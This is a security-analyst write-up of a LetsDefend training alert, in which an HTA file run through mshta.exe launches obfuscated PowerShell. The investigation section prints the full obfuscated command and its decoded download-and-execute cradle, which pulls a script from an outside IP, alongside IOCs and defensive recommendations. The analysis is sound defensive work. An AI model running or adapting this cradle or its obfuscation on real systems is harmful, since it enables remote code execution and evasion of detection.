# SOC164 – Suspicious Mshta Behavior

**Platform:** LetsDefend | **Severity:** High | **Classification:** True Positive | **Date:** March 5, 2022 **Host:** `Roberto` (`172.16.17.38`) | **Binary:** `mshta.exe` | **Event ID:** 114

## Summary

A user on host Roberto ran a low-reputation HTA file with `mshta.exe`, and EDR allowed it. One minute later, obfuscated PowerShell launched by the HTA tried to download and execute a remote script from `193.142.58.23`, so the alert was closed as a true positive and the host was contained.

![01-alert-details](images/soc164-01-alert-details.png)

## The Attack

**HTML Applications (HTA)** look like web pages but run as desktop programs. Their embedded VBScript or JavaScript runs with the user's full permissions, outside the browser sandbox.

`mshta.exe` is the Microsoft-signed program that runs HTA files, which makes it a living-off-the-land binary (LOLBin). Attackers use it because security tools and application allowlisting tend to trust it, and because users who would never open an `.exe` may open an `.hta`.

## Timeline

| Time (alert) | Event |
|--------------|-------|
| 08:16–08:27 | User browses folders by hand (`tree`, `dir`, `cd C:/Users`, `cd robert`, `cd Desktop`)* |
| 10:29 | `mshta.exe C:/Users/roberto/Desktop/Ps1.hta` runs; alert fires at 10:29:16 |
| 10:30 | Obfuscated PowerShell runs a download cradle against `http://193.142.58.23/Server.txt`* |

*Terminal history shows these events in 2021, while the alert is dated 2022-03-05; the times match, so the log sources record dates differently.

## Investigation

### 1. Alert Analysis

- **Host:** `Roberto` (`172.16.17.38`)
- **Binary:** `C:/Windows/System32/mshta.exe`
- **File:** `C:/Users/Roberto/Desktop/Ps1.hta`
- **MD5 of Ps1.hta:** `6685c433705f558c5535789234db0e5a`
- **Trigger:** Low reputation HTA file executed via mshta.exe
- **EDR Action:** Allowed

The file name `Ps1.hta` hints that the HTA carries PowerShell.

### 2. Terminal History Analysis

Terminal history shows a person navigating to the Desktop and running the HTA, followed one minute later by this PowerShell command:

```
powershell.exe function H1($i) {$r = '' ;for ($n = 0; $n -Lt $i.LengthH; $n += 2){$r += [cHar][int]('0x' + $i.Substring($n,2))}return $r};$H2 = (new-object ('{1}{0}{2}' -f 'WebCL','net.','ient'));$H3 = H1 '446f776E';$H4 = H1 '6C6f';$H5 = H1 '616473747269';$H6 = H1 '6E67';$H7 = $H3+$H4+$H5+$H6;$H8 = $H2.$H7('http://193.142.58.23/Server.txt');iEX $H8
```

The command hides its keywords to evade detection:

| Code | Decodes to |
|------|------------|
| `function H1($i)` | Helper that converts hex strings to text |
| `('{1}{0}{2}' -f 'WebCL','net.','ient')` | `net.WebClient` |
| `H1 '446f776E'` + `'6C6f'` + `'616473747269'` + `'6E67'` | `Down` + `lo` + `adstri` + `ng` = `DownloadString` |

Decoded, it is a standard download-and-execute cradle:

```
iEX (New-Object Net.WebClient).DownloadString('http://193.142.58.23/Server.txt')
```

It fetches `Server.txt` from `193.142.58.23` and runs it in memory, with nothing written to disk.

![02-terminal-history](images/soc164-02-terminal-history.png)

### 3. Verdict Reasoning

| Clue | Meaning |
|------|---------|
| Low-reputation HTA run via mshta | LOLBin used to execute untrusted code |
| Hex encoding and string reordering | Deliberate obfuscation; no legitimate purpose |
| `DownloadString` + `iEX` | Remote script downloaded and executed in memory |
| PowerShell one minute after mshta | The HTA launched the payload |
| EDR action Allowed | Nothing stopped the execution |

A user started the HTA by hand, but the HTA itself was malicious, which makes this a **true positive**.

## Artifacts

| Type | Indicator |
|------|-----------|
| MD5 | `6685c433705f558c5535789234db0e5a` (`Ps1.hta`) |
| File | `C:/Users/Roberto/Desktop/Ps1.hta` |
| URL | `hxxp://193.142.58[.]23/Server.txt` |
| IP | `193.142.58[.]23` |

## Response and Recommendations

Host Roberto was contained. Follow-up: search Log Management for connections to `193.142.58.23` to confirm whether `Server.txt` was retrieved, check the parent process of `powershell.exe` to confirm it was spawned by `mshta.exe`, find how `Ps1.hta` reached the Desktop (email attachment, browser download or earlier commands), and block the IP across the environment.

To prevent a repeat, block or restrict `mshta.exe` for standard users, alert on `mshta.exe` spawning `powershell.exe`, enable PowerShell script block logging to capture decoded commands, and block `.hta` attachments at the email gateway.

## Conclusion

**True Positive.** A user ran a malicious HTA file with `mshta.exe` on `Roberto`, which launched obfuscated PowerShell to download and execute a script from `193.142.58.23`. The host was contained.

**MITRE ATT&CK:** T1218.005 (System Binary Proxy Execution: Mshta), T1204.002 (User Execution: Malicious File), T1059.001 (PowerShell), T1027 (Obfuscated Files or Information), T1105 (Ingress Tool Transfer). Alert tag: T1112 (Modify Registry).
